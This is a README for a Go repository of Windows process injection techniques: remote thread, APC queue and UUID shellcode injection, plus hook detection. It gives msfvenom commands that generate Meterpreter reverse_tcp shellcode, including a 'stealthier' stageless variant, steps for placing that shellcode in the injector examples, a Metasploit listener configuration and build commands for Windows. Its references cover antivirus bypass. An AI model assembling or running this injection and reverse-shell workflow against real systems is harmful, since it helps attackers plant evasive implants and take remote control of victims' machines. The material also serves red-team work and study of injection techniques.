# go-inject

Process injection techniques written in Go.

## Examples

* [Classic virtual alloc](examples/x64/valloc/valloc.go)
* [Hook detection](examples/x64/detect-hooks/detect-hooks.go)
* [Heap](examples/x64/heap/heap.go)
* [Remote Thread Injection](examples/x64/remote-thread/remote-thread.go)
* [APC Queue Code Injection](examples/x64/queue-user-apc/queue.go)
* [UUID Injection](examples/x64/uuid/uuid.go)

## Usage

Use msfvenom to generate shellcode:
```bash
# Option 1: Testing with calculator.
msfvenom -p windows/x64/exec CMD=calc.exe -f hex

# Option 2: Reverse tcp stager.
msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444

# Option 3: Stageless payload - stealthier.
msfvenom -p windows/x64/meterpreter_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
```

Place payload string from above command within one of the example .go files replacing the content of the `payload` variable. If using uuid example, use [shellcode-to-uuids](examples/shellcode-to-uuids.go) to convert to payload.

Start listener:

```bash
use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
to_handler
```

## Build

Linux:
```bash
env GOOS=windows GOARCH=amd64 go build
```

Windows:
```bash
$env:GOOS="windows"
go build example.go
```

## References

* https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
* https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
* https://github.com/brimstone/go-shellcode
* https://github.com/sysdream/hershell
* https://github.com/yoda66/MalwareDevTalk
* https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa
* https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
* https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
* https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/